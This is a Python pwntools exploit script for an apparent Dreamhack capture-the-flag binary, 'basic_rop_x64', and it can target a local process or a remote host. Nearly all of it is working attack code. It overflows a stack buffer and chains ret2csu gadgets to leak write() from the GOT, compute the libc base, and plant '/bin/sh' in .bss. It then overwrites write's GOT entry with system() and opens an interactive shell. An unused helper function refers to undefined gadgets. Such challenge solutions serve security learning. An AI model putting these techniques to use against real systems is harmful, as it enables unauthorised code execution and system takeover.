from pwn import *
import sys

context.log_level="debug"

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',15348)
elif sys.argv[1]=="-l":
    p = process('basic_rop_x64')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)
e=ELF('./basic_rop_x64')
libc=ELF('./libc.so.6')

# offsets
write_offset=libc.symbols['write']
system_offset=libc.symbols['system']

# got addresses
write_got=e.got['write']
read_got=e.got['read']

# adresses
csu_pop_stage=0x40087a
csu_setting_stage=0x400860
bss=e.bss()+0x20

binsh="/bin/sh\x00"

def ROP(rdi,rsi,r15,ret):
    payload=""
    payload+=p64(pop_rdi_ret)
    payload+=p64(rdi)
    payload+=p64(pop_rsi_r15_ret)
    payload+=p64(rsi)
    payload+=p64(r15)
    payload+=p64(ret)
    return payload

def CSU_POP_STAGE(address,rdi,rsi,rdx): #
    payload=""
    payload+=p64(0) # rbx
    payload+=p64(1) # rbp
    payload+=p64(address)
    payload+=p64(rdx)
    payload+=p64(rsi)
    payload+=p64(rdi)
    payload+=p64(csu_setting_stage)
    return payload
    


#log.info("/bin/sh offset: "+hex(binsh_offset))

payload="A"*72
payload+=p64(csu_pop_stage)
payload+=CSU_POP_STAGE(write_got,1,write_got,8)
payload+="C"*8
payload+=CSU_POP_STAGE(read_got,0,bss,10)
payload+="C"*8
payload+=CSU_POP_STAGE(read_got,0,write_got,8)
payload+="C"*8
payload+=CSU_POP_STAGE(write_got,bss,0,0)

p.send(payload)

log.info(p.recv()) # recv write() in main()

write_address=u64(p.recv())
libc_base=write_address-write_offset
system_address=libc_base+system_offset

log.info("bss_address: "+hex(bss))
log.info("write_address: "+hex(write_address))
log.info("libc_base: "+hex(write_address-write_offset))
log.info("system_address: "+hex(system_address))

p.send(binsh)

p.send(p64(system_address))

p.interactive()